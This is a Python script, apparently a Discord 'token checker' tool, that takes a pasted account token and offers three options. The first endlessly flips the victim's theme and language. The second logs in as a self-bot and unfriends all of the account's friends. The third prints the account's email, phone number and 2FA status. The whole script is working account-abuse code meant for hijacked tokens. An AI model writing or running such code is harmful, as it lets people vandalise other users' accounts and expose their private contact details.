import threading, requests, discord, random, time, os, urllib
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from discord.ext import commands 
import discord
import os
import ctypes
import colorama
import requests
import time
from colorama import Fore


init(convert=True)
clear = lambda: os.system('clear') 
guildsIds = []
friendsIds = []
privatechannelIds = []
clear()

Client = discord.Client()

CLient = commands.Bot(command_prefix='-', self_bot=True)

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for pc in self.private_channels:
            privatechannelIds.append(pc.id)

        await self.logout()

print(f"""　

┌───── •✧✧• ─────┐
  -TOKEN CHECKER-   
└───── •✧✧• ─────┘

paste token into "Token:" section 
enjoy you slow random 😐                             
                            {Fore.RESET}
""") 

print('\n')
token = input("Token: ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

print('\n')
print('1 TROLL')
print('2 UNFREIND EVERYONE')
print('3 TOKEN INFO')
print('\n')


def troll():
    print('trolling token')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting) 


def unfriender():
    print("UNFRIENDING")
    
    @Client.event
    async def on_ready():
        print('Status : [Unfriend Everyone]')
    
        for user in Client.user.friends:
            try:
                await user.remove_friend()
                print(f'Unfriended {user}')
            except:
                print(f"Can't Unfriend {user}")
        
        print('\n')
        print('[Restart To reuse]')
        print('\n')
    Client.run(token, bot=False)



def tokenInfo():
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [User Name] {userName}
            [2 Factor] {mfa}
            [Email] {email}
            [Phone number] {phone}
            ''')
            input()


def mainanswer():
    answer = input('Choose : ')
    if answer == '1':
     troll()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        tokenInfo()
    else:
        print('[/] Bad input, try again')
        mainanswer()

mainanswer()
